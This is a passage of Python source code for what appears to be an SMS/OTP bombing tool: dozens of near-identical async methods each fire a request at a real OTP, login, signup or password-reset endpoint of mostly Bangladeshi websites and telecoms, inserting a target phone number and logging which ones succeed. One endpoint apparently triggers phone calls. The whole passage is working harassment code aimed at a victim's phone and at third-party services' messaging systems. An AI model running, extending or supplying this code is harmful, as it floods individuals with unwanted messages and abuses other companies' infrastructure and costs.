    @smart_api
    async def api_api_new_24(self):
        target = self.target
        url = "https://developer.quizgiri.xyz:443/api/v2.0/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_24 - developer.quizgiri.xyz:443", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_24 - developer.quizgiri.xyz:443", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_25(self):
        target = self.target
        url = "https://weblogin.grameenphone.com/backend/api/v1/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_25 - weblogin.grameenphone.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_25 - weblogin.grameenphone.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_26(self):
        target = self.target
        url = "https://www.jayabaji3.com/api/user/request-login-tac".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_26 - www.jayabaji3.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_26 - www.jayabaji3.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_27(self):
        target = self.target
        url = "https://cms.surveylancer.com/api/app/v1/user/otp-send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_27 - cms.surveylancer.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_27 - cms.surveylancer.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_28(self):
        target = self.target
        url = "https://dressup.com.bd/?login=true&redirect_to&page=1".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_28 - dressup.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_28 - dressup.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_29(self):
        target = self.target
        url = "https://frontendapi.kireibd.com/api/v2/send-login-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_29 - frontendapi.kireibd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_29 - frontendapi.kireibd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_30(self):
        target = self.target
        url = "https://prod.saralifestyle.com/api/Master/SendTokenV1".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_30 - prod.saralifestyle.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_30 - prod.saralifestyle.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_31(self):
        target = self.target
        url = "https://www.jayabaji3.com/api/user/new-mobile-request".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_31 - www.jayabaji3.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_31 - www.jayabaji3.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_32(self):
        target = self.target
        url = "https://www.pkluck2.com/wps/verification/sms/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_32 - www.pkluck2.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_32 - www.pkluck2.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_33(self):
        target = self.target
        url = "https://w8team.top/api/sipcal/call1.php?number={phone}".replace("{phone}", target)
        try:
            async with self.session.get(url, json={"number": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_33 - w8team.top", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_33 - w8team.top", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_34(self):
        target = self.target
        url = "https://webloginda.grameenphone.com/backend/api/v1/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_34 - webloginda.grameenphone.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_34 - webloginda.grameenphone.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_35(self):
        target = self.target
        url = "https://api.motionview.com.bd/api/send-otp-phone-signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_35 - api.motionview.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_35 - api.motionview.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_36(self):
        target = self.target
        url = "https://bikroy.com/en?login-modal=true&redirect-url=/en".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_36 - bikroy.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_36 - bikroy.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_37(self):
        target = self.target
        url = "https://cms.beautybooth.com.bd/api/v2/auth/register-new".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_37 - cms.beautybooth.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_37 - cms.beautybooth.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_38(self):
        target = self.target
        url = "https://cms.beta.praavahealth.com/api/v2/user/register/".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_38 - cms.beta.praavahealth.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_38 - cms.beta.praavahealth.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_39(self):
        target = self.target
        url = "https://fabrilifess.com/api/wp-json/wc/v2/user/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_39 - fabrilifess.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_39 - fabrilifess.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_40(self):
        target = self.target
        url = "https://www.bdstall.com/userRegistration/save_otp_info/".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_40 - www.bdstall.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_40 - www.bdstall.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_41(self):
        target = self.target
        url = "https://api-merchant.carrybee.com/api/v2/forget-password".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_41 - api-merchant.carrybee.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_41 - api-merchant.carrybee.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_42(self):
        target = self.target
        url = "https://fundesh.com.bd/api/auth/generateOTP?service_key=".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_42 - fundesh.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_42 - fundesh.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_43(self):
        target = self.target
        url = "https://mybtcl.btcl.gov.bd/api/bcare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_43 - mybtcl.btcl.gov.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_43 - mybtcl.btcl.gov.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_44(self):
        target = self.target
        url = "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_44 - mybtcl.btcl.gov.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_44 - mybtcl.btcl.gov.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_45(self):
        target = self.target
        url = "https://ultimateasiteapi.com/api/forget-customer-password".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_45 - ultimateasiteapi.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_45 - ultimateasiteapi.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_46(self):
        target = self.target
        url = "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_46 - api.mygp.cinematic.mobi", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_46 - api.mygp.cinematic.mobi", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_47(self):
        target = self.target
        url = "https://api.chardike.com/api/3f8d1e74-9a5c-4f2d-a7b1-6c8e2d91f4ab/".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_47 - api.chardike.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_47 - api.chardike.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_48(self):
        target = self.target
        url = "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_48 - api.mygp.cinematic.mobi", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_48 - api.mygp.cinematic.mobi", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_49(self):
        target = self.target
        url = "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_49 - bajistar.com:1443", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_49 - bajistar.com:1443", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_50(self):
        target = self.target
        url = "https://fabrilifess.com/api/wp-json/wc/v2/user/phone-login/{phone}".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_50 - fabrilifess.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_50 - fabrilifess.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_51(self):
        target = self.target
        url = "https://ali2bd-api.service.moveon.global/api/consumer/v1/auth/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_51 - ali2bd-api.service.moveon.global", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_51 - ali2bd-api.service.moveon.global", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_52(self):
        target = self.target
        url = "https://distribution.hishabee.business/api/app/v1/auth/number-check".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"number": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_52 - distribution.hishabee.business", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_52 - distribution.hishabee.business", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_53(self):
        target = self.target
        url = "https://api.ecommerce.esquireelectronicsltd.com/api/otp/generate-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_53 - api.ecommerce.esquireelectronicsltd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_53 - api.ecommerce.esquireelectronicsltd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_54(self):
        target = self.target
        url = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_54 - api.ghoorilearning.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_54 - api.ghoorilearning.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_55(self):
        target = self.target
        url = "https://othoba.com/registerresult/5?returnUrl=%2F&phoneNumber={phone}".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_55 - othoba.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_55 - othoba.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_56(self):
        target = self.target
        url = "https://tethys.trucklagbe.com/tl_gateway/tl_login/128/checkUserStatus".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_56 - tethys.trucklagbe.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_56 - tethys.trucklagbe.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_57(self):
        target = self.target
        url = "https://storeapi.electronicsbangladesh.com/api/auth/send-otp-for-login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_57 - storeapi.electronicsbangladesh.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_57 - storeapi.electronicsbangladesh.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_58(self):
        target = self.target
        url = "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_58 - api-dynamic.chorki.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_58 - api-dynamic.chorki.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_59(self):
        target = self.target
        url = "https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_59 - api.cartup.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_59 - api.cartup.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_60(self):
        target = self.target
        url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_60 - api.redx.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_60 - api.redx.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_61(self):
        target = self.target
        url = "https://medai-app.medaicloud.live/api/v1/accounts/user/continue_with_phone".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_61 - medai-app.medaicloud.live", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_61 - medai-app.medaicloud.live", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_62(self):
        target = self.target
        url = "https://api.khaasfood.com/api/app/one-time-passwords/token?username={phone}".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_62 - api.khaasfood.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_62 - api.khaasfood.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_63(self):
        target = self.target
        url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_63 - api.deeptoplay.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_63 - api.deeptoplay.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_64(self):
        target = self.target
        url = "https://api.win2gain.com/api/Users/RequestOtp?msisdn={phone}&otpEvent=SignUp".replace("{phone}", target)
        try:
            async with self.session.get(url, json={"msisdn": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_64 - api.win2gain.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_64 - api.win2gain.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_65(self):
        target = self.target
        url = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_65 - api.ghoorilearning.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_65 - api.ghoorilearning.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_66(self):
        target = self.target
        url = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_66 - backoffice.ecourier.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_66 - backoffice.ecourier.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_67(self):
        target = self.target
        url = "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_67 - api.bdkepler.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_67 - api.bdkepler.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_68(self):
        target = self.target
        url = "https://api.win2gain.com/api/Users/RequestOtp?msisdn=880{phone}&otpEvent=SignUp".replace("{phone}", target)
        try:
            async with self.session.get(url, json={"msisdn": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_68 - api.win2gain.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_68 - api.win2gain.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_69(self):
        target = self.target
        url = "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_69 - meenabazardev.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_69 - meenabazardev.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_70(self):
        target = self.target
        url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}".replace("{phone}", target)
        try:
            async with self.session.get(url, json={"number": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_70 - bikroy.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_70 - bikroy.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_71(self):
        target = self.target
        url = "https://mybdjobsorchestrator.bdjobs.com/api/CreateAccountOrchestrator/CreateAccount".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_71 - mybdjobsorchestrator.bdjobs.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_71 - mybdjobsorchestrator.bdjobs.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_72(self):
        target = self.target
        url = "https://api.ecommerce.esquireelectronicsltd.com/api/user/check-user-for-registration".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_72 - api.ecommerce.esquireelectronicsltd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_72 - api.ecommerce.esquireelectronicsltd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_73(self):
        target = self.target
        url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_73 - api-dynamic.bioscopelive.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_73 - api-dynamic.bioscopelive.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_74(self):
        target = self.target
        url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_74 - go-app.paperfly.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_74 - go-app.paperfly.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_75(self):
        target = self.target
        url = "http://103.4.145.86:8096/api/app/v1/otp/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_75 - 103.4.145.86:8096", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_75 - 103.4.145.86:8096", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_76(self):
        target = self.target
        url = "https://accountkit.sheba.xyz/api/shoot-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_76 - accountkit.sheba.xyz", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_76 - accountkit.sheba.xyz", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_77(self):
        target = self.target
        url = "https://admin.china2bd.com.bd/api/send-otp/".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_77 - admin.china2bd.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_77 - admin.china2bd.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_78(self):
        target = self.target
        url = "https://admin.shebaelectronics.co/api/customer/register/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_78 - admin.shebaelectronics.co", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_78 - admin.shebaelectronics.co", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_79(self):
        target = self.target
        url = "https://api-merchant.carrybee.com/api/v2/merchant/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_79 - api-merchant.carrybee.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
